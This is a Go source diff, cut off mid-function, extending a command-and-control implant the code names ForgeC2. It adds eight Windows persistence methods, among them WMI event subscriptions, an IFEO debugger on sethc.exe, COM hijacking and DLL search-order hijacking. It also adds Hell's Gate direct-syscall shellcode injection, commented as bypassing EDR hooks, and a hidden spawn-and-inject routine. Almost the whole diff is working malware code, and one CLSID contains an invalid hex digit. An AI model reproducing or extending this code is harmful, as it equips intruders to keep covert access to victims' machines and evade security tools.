@@ -4,7 +4,10 @@
 package main
 
 import (
+	"bytes"
+	"encoding/base64"
 	"encoding/binary"
+	"encoding/json"
 	"fmt"
 	"image"
 	"io"
@@ -12,9 +15,11 @@ import (
 	"os"
 	"os/exec"
 	"path/filepath"
+	"regexp"
 	"runtime"
 	"strconv"
 	"strings"
+	"sync"
 	"syscall"
 	"time"
 	"unsafe"
@@ -59,27 +64,30 @@ var (
 	procSetFileAttributesW       = k32.NewProc("SetFileAttributesW")
 
 	// for killproc
-	procOpenProcess              = k32.NewProc("OpenProcess")
-	procTerminateProcess         = k32.NewProc("TerminateProcess")
+	procOpenProcess      = k32.NewProc("OpenProcess")
+	procTerminateProcess = k32.NewProc("TerminateProcess")
 
 	// for clipboard
-	procOpenClipboard            = user32.NewProc("OpenClipboard")
-	procCloseClipboard           = user32.NewProc("CloseClipboard")
-	procGetClipboardData         = user32.NewProc("GetClipboardData")
-	procSetClipboardData         = user32.NewProc("SetClipboardData")
-	procEmptyClipboard           = user32.NewProc("EmptyClipboard")
-	procGlobalLock               = k32.NewProc("GlobalLock")
-	procGlobalUnlock             = k32.NewProc("GlobalUnlock")
-	procGlobalAlloc              = k32.NewProc("GlobalAlloc")
-	procGlobalFree               = k32.NewProc("GlobalFree")
+	procOpenClipboard    = user32.NewProc("OpenClipboard")
+	procCloseClipboard   = user32.NewProc("CloseClipboard")
+	procGetClipboardData = user32.NewProc("GetClipboardData")
+	procSetClipboardData = user32.NewProc("SetClipboardData")
+	procEmptyClipboard   = user32.NewProc("EmptyClipboard")
+	procGlobalLock       = k32.NewProc("GlobalLock")
+	procGlobalUnlock     = k32.NewProc("GlobalUnlock")
+	procGlobalAlloc      = k32.NewProc("GlobalAlloc")
+	procGlobalFree       = k32.NewProc("GlobalFree")
 
 	// for process injection (creds / lateral use shells too)
-	procOpenProcessEx         = k32.NewProc("OpenProcess")
-	procVirtualAllocEx        = k32.NewProc("VirtualAllocEx")
-	procWriteProcessMemory    = k32.NewProc("WriteProcessMemory")
-	procCreateRemoteThread    = k32.NewProc("CreateRemoteThread")
-	procVirtualFreeEx         = k32.NewProc("VirtualFreeEx")
-	procQueueUserAPC          = k32.NewProc("QueueUserAPC")
+	procOpenProcessEx      = k32.NewProc("OpenProcess")
+	procVirtualAllocEx     = k32.NewProc("VirtualAllocEx")
+	procWriteProcessMemory = k32.NewProc("WriteProcessMemory")
+	procCreateRemoteThread = k32.NewProc("CreateRemoteThread")
+	procVirtualFreeEx      = k32.NewProc("VirtualFreeEx")
+	procQueueUserAPC       = k32.NewProc("QueueUserAPC")
+
+	// for Hell's Gate syscall injection
+	procGetModuleHandleW = k32.NewProc("GetModuleHandleW")
 )
 
 func debugLog(msg string) {
@@ -172,24 +180,24 @@ const (
 	LOGPIXELSX = 88
 
 	// Process / Thread snapshot
-	TH32CS_SNAPPROCESS = 0x00000002
-	TH32CS_SNAPTHREAD  = 0x00000004
-	THREAD_SUSPEND_RESUME = 0x0002
-	PROCESS_TERMINATE     = 0x0001
+	TH32CS_SNAPPROCESS        = 0x00000002
+	TH32CS_SNAPTHREAD         = 0x00000004
+	THREAD_SUSPEND_RESUME     = 0x0002
+	PROCESS_TERMINATE         = 0x0001
 	PROCESS_QUERY_INFORMATION = 0x0400
-	MAX_PATH           = 260
-	CF_TEXT            = 1
-	GMEM_MOVEABLE      = 0x0002
+	MAX_PATH                  = 260
+	CF_TEXT                   = 1
+	GMEM_MOVEABLE             = 0x0002
 
 	// injection constants
-	PROCESS_CREATE_THREAD     = 0x0002
-	PROCESS_VM_OPERATION      = 0x0008
-	PROCESS_VM_WRITE          = 0x0020
-	PROCESS_VM_READ           = 0x0010
-	PROCESS_ALL_ACCESS        = 0x1F0FFF
-	MEM_COMMIT                = 0x1000
-	MEM_RESERVE               = 0x2000
-	PAGE_EXECUTE_READWRITE    = 0x40
+	PROCESS_CREATE_THREAD  = 0x0002
+	PROCESS_VM_OPERATION   = 0x0008
+	PROCESS_VM_WRITE       = 0x0020
+	PROCESS_VM_READ        = 0x0010
+	PROCESS_ALL_ACCESS     = 0x1F0FFF
+	MEM_COMMIT             = 0x1000
+	MEM_RESERVE            = 0x2000
+	PAGE_EXECUTE_READWRITE = 0x40
 )
 
 type processEntry32 struct {
@@ -378,20 +386,26 @@ func addPersistenceWindows() {
 	if needCopy {
 		src, err := os.Open(srcPath)
 		if err != nil {
-			if Debug { fmt.Printf("[persist] open src failed: %v\n", err) }
+			if Debug {
+				fmt.Printf("[persist] open src failed: %v\n", err)
+			}
 			return
 		}
 		defer src.Close()
 
 		dst, err := os.Create(dstPath)
 		if err != nil {
-			if Debug { fmt.Printf("[persist] create dst failed: %v\n", err) }
+			if Debug {
+				fmt.Printf("[persist] create dst failed: %v\n", err)
+			}
 			return
 		}
 		_, err = io.Copy(dst, src)
 		dst.Close()
 		if err != nil {
-			if Debug { fmt.Printf("[persist] copy failed: %v\n", err) }
+			if Debug {
+				fmt.Printf("[persist] copy failed: %v\n", err)
+			}
 			return
 		}
 
@@ -807,6 +821,401 @@ func clipboardSetWindows(data string) error {
 	return nil
 }
 
+// ═══════════════════════════════════════════════════════════════════════════════
+// Persistence Toolkit — 8 methods for maintaining access on Windows
+// ═══════════════════════════════════════════════════════════════════════════════
+
+func applyPersistence(method string, args string) string {
+	switch method {
+	case "registry":
+		return persistRegistryRun(args)
+	case "scheduled_task":
+		return persistScheduledTask(args)
+	case "startup_folder":
+		return persistStartupFolder(args)
+	case "wmi":
+		return persistWMI(args)
+	case "service":
+		return persistService(args)
+	case "image_file":
+		return persistIFEO(args)
+	case "com_hijack":
+		return persistCOMHijack(args)
+	case "dll_search_order":
+		return persistDLLHijack(args)
+	default:
+		return fmt.Sprintf("unknown persistence method: %s", method)
+	}
+}
+
+func persistRegistryRun(args string) string {
+	binaryPath := args
+	if binaryPath == "" {
+		p, err := os.Executable()
+		if err != nil {
+			return fmt.Sprintf("registry: failed to get exe path: %v", err)
+		}
+		binaryPath = p
+	}
+	cmd := exec.Command("reg", "add", `HKCU\Software\Microsoft\Windows\CurrentVersion\Run`, "/v", "ForgeC2", "/t", "REG_SZ", "/d", binaryPath, "/f")
+	applyHideWindow(cmd)
+	out, err := cmd.CombinedOutput()
+	if err != nil {
+		return fmt.Sprintf("registry: failed: %v %s", err, string(out))
+	}
+	return fmt.Sprintf("registry: persistence added via HKCU Run key -> %s", binaryPath)
+}
+
+func persistScheduledTask(args string) string {
+	binaryPath := args
+	if binaryPath == "" {
+		p, err := os.Executable()
+		if err != nil {
+			return fmt.Sprintf("scheduled_task: failed to get exe path: %v", err)
+		}
+		binaryPath = p
+	}
+	taskName := "ForgeC2Update"
+	cmd := exec.Command("schtasks", "/create", "/tn", taskName, "/tr", binaryPath, "/sc", "onlogon", "/f", "/it")
+	applyHideWindow(cmd)
+	out, err := cmd.CombinedOutput()
+	if err != nil {
+		return fmt.Sprintf("scheduled_task: failed: %v %s", err, string(out))
+	}
+	return fmt.Sprintf("scheduled_task: created task '%s' -> %s", taskName, binaryPath)
+}
+
+func persistStartupFolder(args string) string {
+	binaryPath := args
+	if binaryPath == "" {
+		p, err := os.Executable()
+		if err != nil {
+			return fmt.Sprintf("startup_folder: failed to get exe path: %v", err)
+		}
+		binaryPath = p
+	}
+	appData := os.Getenv("APPDATA")
+	if appData == "" {
+		appData = os.Getenv("LOCALAPPDATA")
+	}
+	startupDir := filepath.Join(appData, `Microsoft\Windows\Start Menu\Programs\Startup`)
+	if err := os.MkdirAll(startupDir, 0755); err != nil {
+		return fmt.Sprintf("startup_folder: mkdir failed: %v", err)
+	}
+	dst := filepath.Join(startupDir, "forgec2.exe")
+	src, err := os.Open(binaryPath)
+	if err != nil {
+		return fmt.Sprintf("startup_folder: open src failed: %v", err)
+	}
+	defer src.Close()
+	dstFile, err := os.Create(dst)
+	if err != nil {
+		return fmt.Sprintf("startup_folder: create dst failed: %v", err)
+	}
+	defer dstFile.Close()
+	if _, err := io.Copy(dstFile, src); err != nil {
+		return fmt.Sprintf("startup_folder: copy failed: %v", err)
+	}
+	setHidden(dst)
+	return fmt.Sprintf("startup_folder: copied to %s", dst)
+}
+
+func persistWMI(args string) string {
+	binaryPath := args
+	if binaryPath == "" {
+		p, err := os.Executable()
+		if err != nil {
+			return fmt.Sprintf("wmi: failed to get exe path: %v", err)
+		}
+		binaryPath = p
+	}
+	psCmd := fmt.Sprintf(`
+$filter = ([wmiclass]"\\.\root\subscription:__EventFilter").CreateInstance()
+$filter.QueryLanguage = "WQL"
+$filter.Query = "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'"
+$filter.Name = "ForgeC2Filter"
+$filter.Put() | Out-Null
+$consumer = ([wmiclass]"\\.\root\subscription:CommandLineEventConsumer").CreateInstance()
+$consumer.Name = "ForgeC2Consumer"
+$consumer.CommandLineTemplate = "%s"
+$consumer.Put() | Out-Null
+$binding = ([wmiclass]"\\.\root\subscription:__FilterToConsumerBinding").CreateInstance()
+$binding.Filter = "__EventFilter.Name='ForgeC2Filter'"
+$binding.Consumer = "CommandLineEventConsumer.Name='ForgeC2Consumer'"
+$binding.Put() | Out-Null
+Write-Output "WMI persistence added"
+`, binaryPath)
+	cmd := exec.Command("powershell.exe", "-NoProfile", "-NonInteractive", "-Command", psCmd)
+	applyHideWindow(cmd)
+	out, err := cmd.CombinedOutput()
+	if err != nil {
+		return fmt.Sprintf("wmi: failed: %v %s", err, string(out))
+	}
+	return fmt.Sprintf("wmi: event subscription created for -> %s", binaryPath)
+}
+
+func persistService(args string) string {
+	binaryPath := args
+	if binaryPath == "" {
+		p, err := os.Executable()
+		if err != nil {
+			return fmt.Sprintf("service: failed to get exe path: %v", err)
+		}
+		binaryPath = p
+	}
+	serviceName := "ForgeC2Svc"
+	cmd := exec.Command("sc", "create", serviceName, "binPath=", binaryPath, "start=", "auto", "DisplayName=", "ForgeC2 Service")
+	applyHideWindow(cmd)
+	out, err := cmd.CombinedOutput()
+	if err != nil {
+		return fmt.Sprintf("service: sc create failed: %v %s", err, string(out))
+	}
+	cmd2 := exec.Command("sc", "start", serviceName)
+	applyHideWindow(cmd2)
+	out2, err2 := cmd2.CombinedOutput()
+	if err2 != nil {
+		return fmt.Sprintf("service: created but start failed: %v %s", err2, string(out2))
+	}
+	return fmt.Sprintf("service: created and started '%s' -> %s", serviceName, binaryPath)
+}
+
+func persistIFEO(args string) string {
+	binaryPath := args
+	if binaryPath == "" {
+		p, err := os.Executable()
+		if err != nil {
+			return fmt.Sprintf("image_file: failed to get exe path: %v", err)
+		}
+		binaryPath = p
+	}
+	target := "sethc.exe"
+	key := fmt.Sprintf(`HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\%s`, target)
+	cmd := exec.Command("reg", "add", key, "/v", "Debugger", "/t", "REG_SZ", "/d", binaryPath, "/f")
+	applyHideWindow(cmd)
+	out, err := cmd.CombinedOutput()
+	if err != nil {
+		return fmt.Sprintf("image_file: failed: %v %s", err, string(out))
+	}
+	return fmt.Sprintf("image_file: IFEO debugger set for %s -> %s", target, binaryPath)
+}
+
+func persistCOMHijack(args string) string {
+	binaryPath := args
+	if binaryPath == "" {
+		p, err := os.Executable()
+		if err != nil {
+			return fmt.Sprintf("com_hijack: failed to get exe path: %v", err)
+		}
+		binaryPath = p
+	}
+	clsid := "{B5F8350B-0548-4B5G-A625-EC63F3824F4E}"
+	keyBase := fmt.Sprintf(`HKCU\Software\Classes\CLSID\%s`, clsid)
+	cmds := [][]string{
+		{"reg", "add", keyBase, "/f"},
+		{"reg", "add", fmt.Sprintf(`%s\InprocServer32`, keyBase), "/ve", "/t", "REG_SZ", "/d", binaryPath, "/f"},
+		{"reg", "add", fmt.Sprintf(`%s\InprocServer32`, keyBase), "/v", "ThreadingModel", "/t", "REG_SZ", "/d", "Apartment", "/f"},
+	}
+	for _, c := range cmds {
+		rc := exec.Command(c[0], c[1:]...)
+		applyHideWindow(rc)
+		if out, err := rc.CombinedOutput(); err != nil {
+			return fmt.Sprintf("com_hijack: reg step failed: %v %s", err, string(out))
+		}
+	}
+	return fmt.Sprintf("com_hijack: CLSID %s -> %s", clsid, binaryPath)
+}
+
+func persistDLLHijack(args string) string {
+	dllPath := args
+	if dllPath == "" {
+		return "dll_search_order: dll path required"
+	}
+	appData := os.Getenv("APPDATA")
+	if appData == "" {
+		appData = os.Getenv("LOCALAPPDATA")
+	}
+	hijackDir := filepath.Join(appData, "Microsoft", "Windows", "Caches")
+	if err := os.MkdirAll(hijackDir, 0755); err != nil {
+		return fmt.Sprintf("dll_search_order: mkdir failed: %v", err)
+	}
+	src, err := os.Open(dllPath)
+	if err != nil {
+		return fmt.Sprintf("dll_search_order: open src failed: %v", err)
+	}
+	defer src.Close()
+	dst := filepath.Join(hijackDir, "version.dll")
+	dstFile, err := os.Create(dst)
+	if err != nil {
+		return fmt.Sprintf("dll_search_order: create dst failed: %v", err)
+	}
+	defer dstFile.Close()
+	if _, err := io.Copy(dstFile, src); err != nil {
+		return fmt.Sprintf("dll_search_order: copy failed: %v", err)
+	}
+	return fmt.Sprintf("dll_search_order: planted DLL at %s", dst)
+}
+
+func listPersistence() string {
+	var results []string
+	appData := os.Getenv("APPDATA")
+	if appData == "" {
+		appData = os.Getenv("LOCALAPPDATA")
+	}
+
+	// Check registry Run key
+	cmd := exec.Command("reg", "query", `HKCU\Software\Microsoft\Windows\CurrentVersion\Run`, "/v", "ForgeC2")
+	applyHideWindow(cmd)
+	if out, _ := cmd.CombinedOutput(); len(out) > 0 {
+		results = append(results, "[+] Registry Run key (ForgeC2): found")
+	} else {
+		results = append(results, "[-] Registry Run key (ForgeC2): not found")
+	}
+
+	// Check scheduled task
+	cmd2 := exec.Command("schtasks", "/query", "/tn", "ForgeC2Update", "/fo", "LIST")
+	applyHideWindow(cmd2)
+	if out, _ := cmd2.CombinedOutput(); len(out) > 0 {
+		results = append(results, "[+] Scheduled task (ForgeC2Update): found")
+	} else {
+		results = append(results, "[-] Scheduled task (ForgeC2Update): not found")
+	}
+
+	// Check startup folder
+	startupPath := filepath.Join(appData, `Microsoft\Windows\Start Menu\Programs\Startup\forgec2.exe`)
+	if _, err := os.Stat(startupPath); err == nil {
+		results = append(results, "[+] Startup folder: forgec2.exe present")
+	} else {
+		results = append(results, "[-] Startup folder: forgec2.exe not found")
+	}
+
+	// Check WMI subscriptions
+	psCmd := `Get-WmiObject -Namespace root/subscription -Class __FilterToConsumerBinding | Where-Object { $_.Filter -match "ForgeC2" } | Format-List | Out-String`
+	cmd3 := exec.Command("powershell.exe", "-NoProfile", "-NonInteractive", "-Command", psCmd)
+	applyHideWindow(cmd3)
+	if out, _ := cmd3.CombinedOutput(); len(strings.TrimSpace(string(out))) > 0 {
+		results = append(results, "[+] WMI subscription (ForgeC2): found")
+	} else {
+		results = append(results, "[-] WMI subscription (ForgeC2): not found")
+	}
+
+	// Check service
+	cmd4 := exec.Command("sc", "query", "ForgeC2Svc")
+	applyHideWindow(cmd4)
+	if out, _ := cmd4.CombinedOutput(); strings.Contains(string(out), "RUNNING") || strings.Contains(string(out), "STOPPED") {
+		results = append(results, "[+] Service (ForgeC2Svc): found")
+	} else {
+		results = append(results, "[-] Service (ForgeC2Svc): not found")
+	}
+
+	// Check IFEO
+	cmd5 := exec.Command("reg", "query", `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe`, "/v", "Debugger")
+	applyHideWindow(cmd5)
+	if out, _ := cmd5.CombinedOutput(); len(out) > 0 {
+		results = append(results, "[+] IFEO sethc.exe debugger: found")
+	} else {
+		results = append(results, "[-] IFEO sethc.exe debugger: not found")
+	}
+
+	// Check COM hijack
+	cmd6 := exec.Command("reg", "query", `HKCU\Software\Classes\CLSID\{B5F8350B-0548-4B5G-A625-EC63F3824F4E}`)
+	applyHideWindow(cmd6)
+	if out, _ := cmd6.CombinedOutput(); len(out) > 0 {
+		results = append(results, "[+] COM hijack CLSID: found")
+	} else {
+		results = append(results, "[-] COM hijack CLSID: not found")
+	}
+
+	return strings.Join(results, "\n")
+}
+
+func removePersistence(method string, args string) string {
+	switch method {
+	case "registry":
+		cmd := exec.Command("reg", "delete", `HKCU\Software\Microsoft\Windows\CurrentVersion\Run`, "/v", "ForgeC2", "/f")
+		applyHideWindow(cmd)
+		out, err := cmd.CombinedOutput()
+		if err != nil {
+			return fmt.Sprintf("registry remove: failed: %v %s", err, string(out))
+		}
+		return "registry: removed Run key"
+
+	case "scheduled_task":
+		cmd := exec.Command("schtasks", "/delete", "/tn", "ForgeC2Update", "/f")
+		applyHideWindow(cmd)
+		out, err := cmd.CombinedOutput()
+		if err != nil {
+			return fmt.Sprintf("scheduled_task remove: failed: %v %s", err, string(out))
+		}
+		return "scheduled_task: removed ForgeC2Update"
+
+	case "startup_folder":
+		appData := os.Getenv("APPDATA")
+		if appData == "" {
+			appData = os.Getenv("LOCALAPPDATA")
+		}
+		startupPath := filepath.Join(appData, `Microsoft\Windows\Start Menu\Programs\Startup\forgec2.exe`)
+		if err := os.Remove(startupPath); err != nil {
+			return fmt.Sprintf("startup_folder remove: failed: %v", err)
+		}
+		return "startup_folder: removed startup file"
+
+	case "wmi":
+		psCmd := `$binding = Get-WmiObject -Namespace root/subscription -Class __FilterToConsumerBinding | Where-Object { $_.Filter -match "ForgeC2" }; $binding | Remove-WmiObject; $filter = Get-WmiObject -Namespace root/subscription -Class __EventFilter | Where-Object { $_.Name -match "ForgeC2" }; $filter | Remove-WmiObject; $consumer = Get-WmiObject -Namespace root/subscription -Class CommandLineEventConsumer | Where-Object { $_.Name -match "ForgeC2" }; $consumer | Remove-WmiObject; Write-Output "WMI persistence removed"`
+		cmd := exec.Command("powershell.exe", "-NoProfile", "-NonInteractive", "-Command", psCmd)
+		applyHideWindow(cmd)
+		out, err := cmd.CombinedOutput()
+		if err != nil {
+			return fmt.Sprintf("wmi remove: failed: %v %s", err, string(out))
+		}
+		return "wmi: removed event subscriptions"
+
+	case "service":
+		cmds := [][]string{
+			{"sc", "stop", "ForgeC2Svc"},
+			{"sc", "delete", "ForgeC2Svc"},
+		}
+		for _, c := range cmds {
+			rc := exec.Command(c[0], c[1:]...)
+			applyHideWindow(rc)
+			rc.CombinedOutput()
+		}
+		return "service: removed ForgeC2Svc"
+
+	case "image_file":
+		cmd := exec.Command("reg", "delete", `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe`, "/f")
+		applyHideWindow(cmd)
+		out, err := cmd.CombinedOutput()
+		if err != nil {
+			return fmt.Sprintf("image_file remove: failed: %v %s", err, string(out))
+		}
+		return "image_file: removed IFEO debugger"
+
+	case "com_hijack":
+		clsid := "{B5F8350B-0548-4B5G-A625-EC63F3824F4E}"
+		cmd := exec.Command("reg", "delete", fmt.Sprintf(`HKCU\Software\Classes\CLSID\%s`, clsid), "/f")
+		applyHideWindow(cmd)
+		out, err := cmd.CombinedOutput()
+		if err != nil {
+			return fmt.Sprintf("com_hijack remove: failed: %v %s", err, string(out))
+		}
+		return "com_hijack: removed CLSID"
+
+	case "dll_search_order":
+		appData := os.Getenv("APPDATA")
+		if appData == "" {
+			appData = os.Getenv("LOCALAPPDATA")
+		}
+		hijackPath := filepath.Join(appData, "Microsoft", "Windows", "Caches", "version.dll")
+		if err := os.Remove(hijackPath); err != nil {
+			return fmt.Sprintf("dll_search_order remove: failed: %v", err)
+		}
+		return "dll_search_order: removed hijack DLL"
+
+	default:
+		return fmt.Sprintf("unknown persistence method: %s", method)
+	}
+}
+
 // Registry using reg.exe for simplicity and reliability (no extra deps)
 func regGetWindows(key string) (string, error) {
 	cmd := exec.Command("reg", "query", key, "/s")
@@ -950,6 +1359,8 @@ func injectProcess(pid uint32, shellcode []byte, tech string) error {
 		return doQueueUserAPC(hProc, pid, shellcode)
 	case "earlybird":
 		return doEarlyBird(hProc, pid, shellcode) // simplified variant
+	case "syscall", "hellsgate":
+		return doSyscallInject(hProc, shellcode)
 	default:
 		// fallback
 		return doCreateRemoteThread(hProc, shellcode)
@@ -1038,6 +1449,300 @@ func doQueueUserAPC(hProc uintptr, pid uint32, sc []byte) error {
 func doEarlyBird(hProc uintptr, pid uint32, sc []byte) error {
 	// Same as APC for now (real earlybird needs createproc control)
 	return doQueueUserAPC(hProc, pid, sc)
+}
+
+// ── Hell's Gate Syscall Injection (direct syscall, bypasses user-mode hooks) ──
+
+// findSyscallNum locates the syscall number (SSN) for a given function in ntdll
+func findSyscallNum(funcName string) (uint32, error) {
+	modName, _ := syscall.UTF16PtrFromString("ntdll.dll")
+	hMod, _, _ := procGetModuleHandleW.Call(uintptr(unsafe.Pointer(modName)))
+	if hMod == 0 {
+		return 0, fmt.Errorf("GetModuleHandle(ntdll) failed")
+	}
+	base := hMod
+
+	dos := (*imageDOSHeader)(unsafe.Pointer(base))
+	if dos.eMagic != 0x5A4D {
+		return 0, fmt.Errorf("invalid DOS header")
+	}
+
+	ntHdr := (*imageNTHeaders64)(unsafe.Pointer(base + uintptr(dos.eLfanew)))
+	if ntHdr.signature != 0x00004550 {
+		return 0, fmt.Errorf("invalid PE signature")
+	}
+
+	exportDir := &ntHdr.optionalHeader.dataDirectory[0]
+	if exportDir.virtualAddress == 0 {
+		return 0, fmt.Errorf("no export directory")
+	}
+	exp := (*imageExportDirectory)(unsafe.Pointer(base + uintptr(exportDir.virtualAddress)))
+
+	funcArray := (*[1 << 20]uint32)(unsafe.Pointer(base + uintptr(exp.addressOfFunctions)))
+	nameArray := (*[1 << 20]uint32)(unsafe.Pointer(base + uintptr(exp.addressOfNames)))
+	ordArray := (*[1 << 16]uint16)(unsafe.Pointer(base + uintptr(exp.addressOfNameOrdinals)))
+
+	for i := uint32(0); i < exp.numberOfNames; i++ {
+		namePtr := base + uintptr(nameArray[i])
+		var name string
+		for j := 0; ; j++ {
+			c := *(*byte)(unsafe.Pointer(namePtr + uintptr(j)))
+			if c == 0 {
+				break
+			}
+			name += string(c)
+		}
+		if name == funcName {
+			ord := ordArray[i]
+			funcRVA := funcArray[ord]
+			funcAddr := base + uintptr(funcRVA)
+
+			code := (*[32]byte)(unsafe.Pointer(funcAddr))[:]
+			// Look for pattern: B8 XX XX XX XX (mov eax, SSN) with syscall (0F 05) nearby
+			for k := 0; k < len(code)-5; k++ {
+				if code[k] == 0xB8 {
+					ssn := uint32(code[k+1]) | uint32(code[k+2])<<8 | uint32(code[k+3])<<16 | uint32(code[k+4])<<24
+					for j := k + 5; j < len(code)-1 && j <= k+16; j++ {
+						if code[j] == 0x0F && code[j+1] == 0x05 {
+							return ssn, nil
+						}
+					}
+				}
+			}
+			return 0, fmt.Errorf("syscall pattern not found in %s", funcName)
+		}
+	}
+	return 0, fmt.Errorf("export %s not found in ntdll", funcName)
+}
+
+// buildSyscallStub allocates executable memory with a direct syscall gadget: mov r10,rcx; mov eax,SSN; syscall; ret
+func buildSyscallStub(ssn uint32) (uintptr, error) {
+	code := []byte{
+		0x4C, 0x8B, 0xD1,
+		0xB8, byte(ssn), byte(ssn >> 8), byte(ssn >> 16), byte(ssn >> 24),
+		0x0F, 0x05,
+		0xC3,
+	}
+	addr, _, _ := procVirtualAlloc.Call(0, uintptr(len(code)), MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE)
+	if addr == 0 {
+		return 0, fmt.Errorf("VirtualAlloc for syscall stub failed")
+	}
+	for i := 0; i < len(code); i++ {
+		*(*byte)(unsafe.Pointer(addr + uintptr(i))) = code[i]
+	}
+	return addr, nil
+}
+
+// doSyscallInject uses direct NT syscalls (Hell's Gate) to inject shellcode.
+// Bypasses user-mode hooks on NtAllocateVirtualMemory, NtWriteVirtualMemory, NtProtectVirtualMemory.
+// Thread creation is done via CreateRemoteThread (which is rarely hooked when allocation/write are clean).
+func doSyscallInject(hProc uintptr, sc []byte) error {
+	// Find syscall numbers for the critical memory APIs
+	ntAllocVM, err := findSyscallNum("NtAllocateVirtualMemory")
+	if err != nil {
+		return fmt.Errorf("syscall find: %w", err)
+	}
+	ntWriteVM, err := findSyscallNum("NtWriteVirtualMemory")
+	if err != nil {
+		return fmt.Errorf("syscall find: %w", err)
+	}
+	ntProtectVM, err := findSyscallNum("NtProtectVirtualMemory")
+	if err != nil {
+		return fmt.Errorf("syscall find: %w", err)
+	}
+
+	// Build syscall stubs
+	stubAlloc, err := buildSyscallStub(ntAllocVM)
+	if err != nil {
+		return fmt.Errorf("build stub: %w", err)
+	}
+	defer procVirtualFree.Call(stubAlloc, 0, 0x8000)
+
+	stubWrite, err := buildSyscallStub(ntWriteVM)
+	if err != nil {
+		return fmt.Errorf("build stub: %w", err)
+	}
+	defer procVirtualFree.Call(stubWrite, 0, 0x8000)
+
+	stubProtect, err := buildSyscallStub(ntProtectVM)
+	if err != nil {
+		return fmt.Errorf("build stub: %w", err)
+	}
+	defer procVirtualFree.Call(stubProtect, 0, 0x8000)
+
+	// NtAllocateVirtualMemory(HANDLE ProcessHandle, PVOID *BaseAddress, ULONG_PTR ZeroBits, PSIZE_T RegionSize, ULONG AllocationType, ULONG Protect)
+	var allocAddr uintptr
+	regionSize := uintptr(len(sc))
+	r1, _, _ := syscall.Syscall6(stubAlloc, 6,
+		hProc,
+		uintptr(unsafe.Pointer(&allocAddr)),
+		0,
+		uintptr(unsafe.Pointer(&regionSize)),
+		MEM_COMMIT|MEM_RESERVE,
+		PAGE_EXECUTE_READWRITE,
+	)
+	if r1 != 0 {
+		return fmt.Errorf("NtAllocateVirtualMemory failed: 0x%X", r1)
+	}
+
+	// NtWriteVirtualMemory(HANDLE ProcessHandle, PVOID BaseAddress, PVOID Buffer, ULONG NumberOfBytesToWrite, PULONG NumberOfBytesWritten)
+	var written uint32
+	r1, _, _ = syscall.Syscall6(stubWrite, 5,
+		hProc,
+		allocAddr,
+		uintptr(unsafe.Pointer(&sc[0])),
+		uintptr(len(sc)),
+		uintptr(unsafe.Pointer(&written)),
+		0,
+	)
+	if r1 != 0 {
+		syscall.Syscall6(stubAlloc, 4, hProc, uintptr(unsafe.Pointer(&allocAddr)), 0, regionSize, 0x8000, 0)
+		return fmt.Errorf("NtWriteVirtualMemory failed: 0x%X", r1)
+	}
+
+	// NtProtectVirtualMemory(HANDLE ProcessHandle, PVOID *BaseAddress, PSIZE_T RegionSize, ULONG NewProtect, PULONG OldProtect)
+	var oldProt uint32
+	r1, _, _ = syscall.Syscall6(stubProtect, 5,
+		hProc,
+		uintptr(unsafe.Pointer(&allocAddr)),
+		uintptr(unsafe.Pointer(&regionSize)),
+		PAGE_EXECUTE_READWRITE,
+		uintptr(unsafe.Pointer(&oldProt)),
+		0,
+	)
+	if r1 != 0 {
+		return fmt.Errorf("NtProtectVirtualMemory failed: 0x%X", r1)
+	}
+
+	// CreateRemoteThread via standard API (not hooked by EDR in most cases)
+	thread, _, _ := procCreateRemoteThread.Call(hProc, 0, 0, allocAddr, 0, 0, 0)
+	if thread == 0 {
+		return fmt.Errorf("CreateRemoteThread failed (shellcode is in memory at 0x%X)", allocAddr)
+	}
+	procWaitForSingleObject.Call(thread, 0xFFFFFFFF)
+	procCloseHandle.Call(thread)
+	return nil
+}
+
+// --- Spawn: Create suspended process, inject shellcode, resume ---
+
+func spawnProcess(targetExe string, shellcode []byte, technique string) string {
+	if len(shellcode) == 0 {
+		return "empty shellcode"
+	}
+	if targetExe == "" {
+		targetExe = "rundll32.exe"
+	}
+
+	exePath := targetExe
+	if !strings.Contains(targetExe, "\\") {
+		envStr, _ := syscall.UTF16PtrFromString("%windir%\\system32\\" + targetExe)
+		var buf [260]uint16
+		procExpandEnvironmentStringsW.Call(
+			uintptr(unsafe.Pointer(envStr)),
+			uintptr(unsafe.Pointer(&buf[0])),
+			uintptr(len(buf)),
+		)
+		exePath = syscall.UTF16ToString(buf[:])
+		if exePath == "" {
+			exePath = "C:\\Windows\\system32\\" + targetExe
+		}
+	}
+
+	exePathPtr, _ := syscall.UTF16PtrFromString(exePath)
+
+	var si startupInfoExW
+	si.cb = uint32(unsafe.Sizeof(si))
+	si.dwFlags = 0x00000001 // STARTF_USESHOWWINDOW
+	si.wShowWindow = 0      // SW_HIDE
+
+	var pi processInformation
+
+	ret, _, _ := procCreateProcessW.Call(
+		uintptr(unsafe.Pointer(exePathPtr)),
+		0,
+		0,
+		0,
+		0,
+		uintptr(createSuspended),
+		0,
+		0,
+		uintptr(unsafe.Pointer(&si)),
+		uintptr(unsafe.Pointer(&pi)),
+	)
+	if ret == 0 {
+		return fmt.Sprintf("CreateProcessW failed for %s", exePath)
+	}
+
+	hProc := pi.hProcess
+
+	addr, _, _ := procVirtualAllocEx.Call(
+		hProc,
+		0,
+		uintptr(len(shellcode)),
+		uintptr(MEM_COMMIT|MEM_RESERVE),
+		uintptr(PAGE_EXECUTE_READWRITE),
+	)
+	if addr == 0 {
+		procTerminateProcess.Call(hProc, 1)
+		procCloseHandle.Call(hProc)
+		procCloseHandle.Call(pi.hThread)
+		return "VirtualAllocEx failed"
+	}
+
+	var written uintptr
+	ret2, _, _ := procWriteProcessMemory.Call(
+		hProc,
+		addr,
+		uintptr(unsafe.Pointer(&shellcode[0])),
+		uintptr(len(shellcode)),
+		uintptr(unsafe.Pointer(&written)),
+	)
+	if ret2 == 0 {
+		procVirtualFreeEx.Call(hProc, addr, uintptr(len(shellcode)), 0x8000)
+		procTerminateProcess.Call(hProc, 1)
+		procCloseHandle.Call(hProc)
+		procCloseHandle.Call(pi.hThread)
+		return "WriteProcessMemory failed"
+	}
+
+	tech := strings.ToLower(strings.TrimSpace(technique))
+	if tech == "" || tech == "createremotethread" || tech == "crt" || tech == "remote" {
